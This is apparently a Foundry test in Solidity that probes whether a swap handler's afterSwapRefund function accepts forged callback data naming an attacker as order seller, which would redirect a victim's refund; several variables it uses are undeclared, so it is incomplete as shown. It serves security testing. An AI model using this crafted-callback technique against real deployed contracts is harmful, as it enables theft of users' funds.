pragma solidity 0.8.24;
import 'forge-std/Test.sol';

contract AfterSwapRefundTest is Test {
    function testCraftedCallbackDataRedirectsRefund() public {
        // Craft callbackData claiming attacker is the orderSeller
        bytes memory maliciousCallbackData = abi.encode(
            attacker,     // orderSeller (should be victim)
            uint256(1e18), // refundAmount
            victimOrderId
        );

        // Simulate AMM calling afterSwapRefund with crafted data
        vm.prank(address(amm));
        try handler.afterSwapRefund(maliciousCallbackData) {
            // If succeeded: refund sent to attacker
            assertEq(token.balanceOf(attacker), 1e18,
                'Crafted callbackData redirected refund to attacker');
        } catch {
            // If reverted: callbackData has additional integrity protection
            emit log('afterSwapRefund correctly rejected crafted callbackData');
        }
    }
}

